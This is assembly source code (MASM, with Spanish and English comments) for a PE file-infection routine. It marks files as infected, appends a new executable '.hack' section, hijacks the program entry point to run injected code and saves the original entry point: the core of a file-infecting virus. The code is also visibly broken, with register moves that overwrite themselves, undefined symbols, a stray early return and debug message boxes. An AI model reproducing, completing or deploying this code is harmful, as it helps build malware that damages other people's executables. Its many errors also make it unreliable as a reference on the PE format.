ifndef INFECT_FILE_ASM_
INFECT_FILE_ASM_ MACRO
ENDM

.386
.model flat, stdcall
option casemap :none

include \masm32\include\msvcrt.inc
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc 
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\msvcrt.lib

.DATA
    ; Definiciones de datos necesarias para el proceso de infección
    lastsec_ptrtorawdata     dd 0
    lastsec_sizeofrawdata    dd 0
    lastsec_virtualaddress   dd 0
    lastsec_virtualsize      dd 0
    ptr_adressofentrypoint   dd 0
    ptr_numberofsections     dd 0
    ptr_sizeofcode           dd 0
    ptr_sizeofimage          dd 0
    ptr_sizeofheaders        dd 0
    imagebase                dd 0
    filealignment            dd 0
    oldentrypoint            dd 0
    pointertorawdata         dd 0
    ptr_sectionhdrtable      dd 0
    sectionalignment         dd 0
    tmpbuf                   dd 0
    msgText_2                db "Infection Process", 0
    msgCaption_2             db "Alert", 0
    msgCaption_db_1          db "Bytes Comparison", 0
    msgCaption_db_3          db "Image File Header", 0
    msgCaption_db_4          db "Number of Sections", 0
    msgError                 db "Common Error!", 0
    buffer_db_3              db 256 dup (0)
    buffer_db_4              db 256 dup (0)
    msgUpdate                db " Second header was updated!", 0
    msgEnd                   db "End of the infection!", 0

.DATA?
    filesearchhandle_if dd ?

.CODE
start_infect PROC
    ; Simular el proceso de infección
    invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_db_1, MB_OK

     pushad 


     ; Verificar la firma DOS
    invoke MessageBoxA, NULL, esi, addr msgCaption, MB_OK 
    cmp  WORD ptr [esi], "ZM"
    jne  infect_err


    mov  ecx, 042h
    cmp  dword ptr[esi + 034h], ecx
    je   infect_err                           ; Check if file already infected. Infection marker at IMAGE_DOS_HEADER + 0x34 (e_res2[8])
     invoke MessageBoxA, NULL, addr msgCaption, addr msgCaption, MB_OK  
    mov  dword ptr[esi + 034h], ecx 


   

     add  esi, DWORD ptr[esi + 03ch] 
    ; Verificar la firma "PE\0\0"
    cmp  WORD ptr [esi], "EP"    ; Verificar la firma "PE\0\0"
    jne infect_err
     invoke MessageBoxA, NULL,esi, addr msgCaption_db_1, MB_OK 

    ; Mover ESI al Optional Header
    push esi
    add  esi, 04h                             ; esi -> IMAGE_FILE_HEADER
    lea  ecx, dword ptr [esi + 02h]
    mov  esi, ecx            ; Obtener NumberOfSections
    pop  esi                                  ; esi -> IMAGE_NT_HEADERS
    push esi
    add  esi, 017h                            ; esi -> IMAGE_OPTIONAL_HEADER


    ; Modificar DataDirectory[11] (Export Table Bound Headers)
    xor  ecx, ecx
    mov  dword ptr[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx
    mov  dword ptr[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx

   

    ; Verificar Magic Number
    cmp WORD ptr [esi], 0B01h
    jne infect_err

    ; Obtener varios campos del Optional Header
    lea  ecx, dword ptr [esi + 04h]
    lea  eax, dword ptr [ptr_sizeofcode]
    mov  eax, ecx

    lea  ecx, dword ptr [esi + 010h]
    lea  eax, dword ptr [ptr_adressofentrypoint]
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 01ch]
    lea  eax, dword ptr [imagebase]
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 020h]
    lea  eax, dword ptr [sectionalignment]
    mov  eax, ecx

    mov  ecx, dword ptr [esi + 024h]
    lea  eax, dword ptr [filealignment]
    mov  eax, ecx

    lea  ecx, dword ptr [esi + 038h]
    lea  eax, dword ptr [ptr_sizeofimage]
    mov  eax, ecx

    lea  ecx, dword ptr [esi + 03ch]
    lea  eax, dword ptr [ptr_sizeofheaders]
    mov  eax, ecx

    pop  esi                                  ; esi -> IMAGE_NT_HEADERS

    add  esi, dword ptr[ptr_sizeofheaders] ;SIZEOF IMAGE_NT_HEADERS         ; esi -> IMAGE_SECTION_HEADER[0]

    lea  eax, dword ptr [ptr_sectionhdrtable]
    mov  eax, esi

    ; Obtener número de secciones
    mov  ecx, dword ptr [ptr_numberofsections]
    xor  eax, eax
    add  ax, cx

    ; Calcular la última sección
    mov  ecx, dword ptr[ptr_sizeofheaders];SIZEOF IMAGE_SECTION_HEADER
    sub  eax, 1
    mul  ecx
    add  esi, eax                             ; esi -> IMAGE_SECTION_HEADER[last]


    ; Obtener varios campos de la última sección
    mov  ecx, dword ptr[esi + 08h]
    lea  eax, dword ptr [lastsec_virtualsize]
    mov  eax, ecx

    mov  ecx, dword ptr[esi + 0ch]
    lea  eax, dword ptr [lastsec_virtualaddress]
    mov  eax, ecx

    mov  ecx, dword ptr[esi + 010h]
    lea  eax, dword ptr [lastsec_sizeofrawdata]
    mov  eax, ecx

    mov  ecx, dword ptr[esi + 014h]
    lea  eax, dword ptr [lastsec_ptrtorawdata]
    mov  eax, ecx

    ; Necesidad de mover secciones
    push edx
    push esi
    push edi                                  ; Guardar esi
    lea  esi, dword ptr [ptr_sectionhdrtable] ; esi -> IMAGE_SECTION_HEADER[0]

    mov  edi, esi  
    add  edi, 014h
    mov  esi, dword ptr [edi]
    mov  edi, esi                             ; esi = IMAGE_SECTION_HEADER[0].PointerToRawData

 
 ; Calcular edx: tamaño de memoria a mover
   mov  esi, dword ptr[lastsec_ptrtorawdata]
   sub  esi, dword ptr[ptr_sectionhdrtable + 014h]    ; edx = lastsec_ptrtorawdata - IMAGE_SECTION_HEADER[0].PointerToRawData
   
   ; Asegurar que el tamaño de memoria no sea negativo
   ;jns  size_valid
   ;jmp infect_err
   ; xor  esi, esi
       
    

size_valid:

      ;mov  edx, esi                             ; Tamaño calculado en edx
      mov edx,08000h
    ; Llamada a VirtualAlloc con el tamaño correcto en edx
     invoke VirtualAlloc, 0, edx, MEM_COMMIT, PAGE_READWRITE
     
     lea  edi, dword ptr [tmpbuf]
     mov  edi, eax

     ; Verificar si VirtualAlloc falló
     cmp  eax, 0
    je   infect_err

    pop  edx
  
    pop  edi                                  ; Restore registers after function call.

    push edi
    mov  edi,dword ptr [tmpbuf]
    xor eax,eax    
    
 
    call my_memcpy                            ; copy sections to tmpbuf
 
   ; Verificar si la operación fue exitosa
   ;  cmp eax,0
    ;je   infect_err                           ; Si eax es cero, la operación falló
     
    pop  edi  
 
                

                             ; edi -> destination
 
    mov  esi, dword ptr [tmpbuf]
    
    
    call my_memcpy                            ; copy sections back to mapped file.
    
   ; cmp eax,0
    ;je   infect_err 

   
    invoke VirtualFree, dword ptr [tmpbuf], 0, MEM_RELEASE
    ;cmp eax, 0
    ;je infect_err   
     
; --------------------------------------> Update all section headers for new sections offsets in file, ie add filealignment to their offset.

    xor  edx, edx
   
    mov edi, dword ptr[ptr_numberofsections]
     
    xor  eax, eax
    
 
    
    ;mov  word  ax,  di                   ; eax = number of sections ( = *ptr_numberofsections)
    mov  edi, eax                             ; edi = numberofsections
    mov  esi, dword ptr[ptr_sectionhdrtable]             ; esi -> IMAGE_SECTION_HEADER[0]
    call update_sec_hdrs2
     invoke MessageBoxA, NULL, addr msgUpdate, addr msgCaption, MB_OK
    dont_move_sections:
    ; --------------------------------------> Now we can move on to write our new section header.

    pop  esi                                  ; esi -> IMAGE_SECTION_HEADER[last]
   

 

    add  esi,dword ptr[ptr_sizeofheaders]; SIZEOF IMAGE_SECTION_HEADER     ; esi -> IMAGE_SECTION_HEADER[last + 1]

    push esi                                  ;
    mov  edi, esi                             ;
    xor esi,esi                              ;
    mov  edx,dword ptr[ptr_sizeofheaders]; SIZEOF IMAGE_SECTION_HEADER     ;
    
    call my_memset                            ;
    
    pop  esi                                  ; Initialize new section header.

    push esi                                  ; esi save -> IMAGE_SECTION_HEADER[last + 1]
 
    mov  ecx, "cah."                          ;
    
    ;mov esi , dword ptr[esi]
    mov  esi, ecx                           ;
    pop esi

    add  esi, 04h                             ;
    mov  ecx, "k"                             ;
    ;mov  [esi], ecx 
    mov  esi, ecx                           ; Wrote the name of our new section. Niark niark niark...

    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualSize
    mov  ecx, copy_size
    ;mov[esi], ecx
    mov  esi, ecx                           ; Wrote VirtualSize
    
    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualAddress
    mov  ecx, lastsec_virtualaddress
    add  ecx, lastsec_virtualsize
  
    push edx
    mov edx,sectionalignment
    call ceil_align;, ecx, edx
    pop edx

    ;mov  [esi], eax 
    mov  esi, eax                           ; Wrote VirtualAddress
    
    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].SizeOfRawData
   
    
    mov  ecx, copy_size
   
    push edx
     mov edx,filealignment
    call ceil_align;, ecx, edx     ; Align size of our code with fileAlignment
    
    pop edx
  

    mov  dword ptr[esi], eax                           ; Wrote SizeOfRawData
    mov  filesize_sf, eax                        ; new filesize_sf, still need to add pointertorawdata (step 1/2)
    
    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].PointerToRawData
    
    mov  ecx, lastsec_ptrtorawdata
    add  ecx, lastsec_sizeofrawdata
   
    add  ecx, 0200h                           ; For when we move the sections (see around update_sec_hdrs: label)
     mov esi,edx
     ;mov  [esi], ecx                           ; Wrote PointerToRawData
    
    push esi  
    lea esi,dword ptr[pointertorawdata]
    mov  esi, ecx
    pop  esi  
      
                   popad
ret 
    add  ecx, filesize_sf 
    push esi    
    lea esi,dword ptr[filesize_sf]             ;
    mov  esi, ecx                        ; Got our new file size (step 2/2)
    pop esi
    ;;
 
    
                                    ; esi -> IMAGE_SECTION_HEADER[last + 1]
    add  esi, 024h                            ; esi -> IMAGE_SECTION_HEADER[last + 1].Characteristics

    mov  ecx, 060000020h                      ; Contains code | readable | executable
    mov esi,edx
    ;mov  [esi], ecx

; --------------------------------------> New section header finally written. Phew !
; --------------------------------------> Now, let's update the right fields.
    
  ;  mov  ecx, ptr_adressofentrypoint
  ;  mov  edx, [ecx]
  ;  push esi
  ;  lea esi,[oldentrypoint]
 ;   mov  esi, edx
  ;  pop esi
  ;  mov  edx, lastsec_virtualaddress          ;
  ;  add  edx, lastsec_virtualsize             ;
  ;  mov ecx,edx
  ;  push edx
  ;  mov edx,sectionalignment
  ;  invoke ceil_align;, edx, sectionalignment  ;
  ;    invoke MessageBox, NULL, addr msgOfVictory, addr msgOfVictory, MB_OK
  
  
   
     ; Mover la dirección de entrypoint a ecx y el valor de esa dirección a edx
    lea ecx, dword ptr[ptr_adressofentrypoint]
    mov edx, dword ptr[ecx]
   
    ; Guardar el valor de esi en la pila
    push esi
    
    ; Calcular la dirección del oldentrypoint
    lea esi, dword ptr[oldentrypoint]
    pop esi
    push esi
    ;mov esi,dword ptr[esi]
    mov esi, edx
    
    ; Restaurar el valor de esi desde la pila
    pop esi

    ; Calcular la última sección virtual
    mov edx, lastsec_virtualaddress
    add edx, lastsec_virtualsize

    ; Guardar el resultado en ecx
    mov ecx, edx
   
    ; Alinear la dirección de la sección
    push edx
    mov edx, sectionalignment
    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK
    invoke ceil_align
    
   
    ; El resultado de ceil_align debería estar ahora en edx

    ; Mostrar un mensaje para debug
    
    pop edx
    

    add  eax, copy_size              ; newentrypoint = lastsec_virtualaddress + ceil_align(lastsec_virtualsize, sectionalignment) + (start - begin_copy)
    mov  dword ptr[ecx], eax                           ; Updated AddressOfEntryPoint
    
    lea ecx, dword ptr[ptr_numberofsections]
    mov  edx, dword ptr[ecx]
    inc edx
    push ecx
    mov ecx,dword ptr[ecx]
    mov  ecx, edx                           ; Updated NumberOfSections
    pop ecx
    
    lea  ecx, dword ptr[ptr_sizeofcode]
    mov  edx, dword ptr[ecx]
    add  edx, copy_size
    mov ecx,dword ptr[ecx]
    mov  ecx, eax 
    push ecx
    mov ecx,edx
    push edx
    mov edx,sectionalignment
    call ceil_align;, ecx=size, edx=sectionalignment
    pop edx 
    pop ecx                          ; Updated SizeOfCode
    
    lea ecx, dword ptr[ptr_sizeofimage]
    
    mov  edx, dword ptr[ecx]
    push ecx
    add  edx, copy_size 
    mov ecx,edx
    push edx
    mov edx,sectionalignment
    
    call ceil_align;, edx, sectionalignment
    
    pop edx
    pop ecx
    

    push ecx
    mov ecx,dword ptr[ecx]
    mov  ecx, eax                           ; Updated SizeOfImage
    pop ecx
    
; --------------------------------------> PE fields updated.
; --------------------------------------> Let's write our code where it belongs.
    
   push ecx
    lea  edi,dword ptr[filebuffer]
    
   lea  ecx,dword ptr[pointertorawdata]
    add edi,ecx
    pop ecx
    
   ;add edi,ecx
    
   
    push esi
    mov  esi, begin_copy
    add  esi, ebx                             ; ebx = delta offset. This is to be position independent.
    mov  edx, dword ptr[copy_size]
    invoke my_memcpy
    
    pop  esi                                  ; Wrote new section to infected file.

; --------------------------------------> Write oldentrypoint to the 4 first bytes of infected file

    lea  ecx, dword ptr [filebuffer]
    add  ecx, pointertorawdata
    mov  edx, oldentrypoint
    mov  dword ptr[ecx], edx                           ; Wrote oldentrypoint to new section.
    
 
   
   mov  eax, 1
   jmp  end_infect                             ; return 0 or 1 depending on error.
 
infect_err:
    invoke MessageBoxA, NULL, addr msgError, addr msgCaption, MB_OK
    ret

end_infect:

    mov  eax, filesize_sf
    invoke MessageBoxA, NULL, addr msgEnd , addr msgCaption, MB_OK
    popad 
    ret 
 start_infect endp

update_sec_hdrs2:
    ; Guardar registros usados
    push esi
    push edi
    push ebx

    ; ebx contiene la base del archivo PE
    mov esi, ebx

    ; Verificar la firma DOS (MZ)
    cmp word ptr [esi], IMAGE_DOS_SIGNATURE
    jne not_pe_file

    ; Ir al e_lfanew en IMAGE_DOS_HEADER
    mov eax, [esi + 3Ch]
    add esi, eax

    ; Verificar la firma NT (PE)
    cmp dword ptr [esi], IMAGE_NT_SIGNATURE
    jne not_pe_file

    ; Ir al primer IMAGE_SECTION_HEADER
    add esi, 18h   ; Saltar IMAGE_FILE_HEADER
    mov ecx, [esi + 14h] ; Número de secciones
    add esi, 60h   ; Saltar IMAGE_OPTIONAL_HEADER

    ; Ahora esi apunta al primer IMAGE_SECTION_HEADER
    ; Inicializar edx como el índice de la primera sección
    xor edx, edx

update_loop:
    ; Mensaje de depuración para verificar el valor de esi antes de acceder a la memoria
   

    ; Cargar el PointerToRawData de la sección actual
    mov ecx,  dword ptr[esi + 14h]  ; Cargar IMAGE_SECTION_HEADER[edx].PointerToRawData en ecx
    
    ; Mensaje de depuración para comprobar el valor de ecx
    

    ; Actualizar el PointerToRawData con filealignment
    add ecx, dword ptr[filealignment]
    push esi
    mov esi,dword ptr [esi+14]
    mov esi, ecx  ; Almacenar el nuevo PointerToRawData
    pop esi

    ; Incrementar el índice de sección
    inc edx

    ; Mover el puntero al siguiente IMAGE_SECTION_HEADER
    add esi, dword ptr[ptr_sizeofheaders];SIZEOF_IMAGE_SECTION_HEADER

    ; Mensaje de depuración para verificar el nuevo valor de esi
    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK

    ; Comparar edx con el número total de secciones
    cmp edx, ecx
    jl update_loop

    ; Restaurar registros usados
    pop ebx
    pop edi
    pop esi

    ret

not_pe_file:
    ; Manejar el caso en que el archivo no es un archivo PE válido
    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK
    pop ebx
    pop edi
    pop esi
    ret

;my_peset PROC 

;    push ebx
;    push edx

;    mov  eax, edi
;    mov  ecx, edi
;    lea  ebx, [edi + edx]
;    test edi, edi            ; Test if s is NULL
;    je   lbl_end

;lbl_loop:
;    mov edx, esi
;    mov BYTE ptr [ecx], dl
;    inc ecx
;    cmp ecx, ebx
;    jb  lbl_loop

;lbl_end:
;    pop edx
;    pop ebx

;    ret
;my_peset ENDP
   

endif  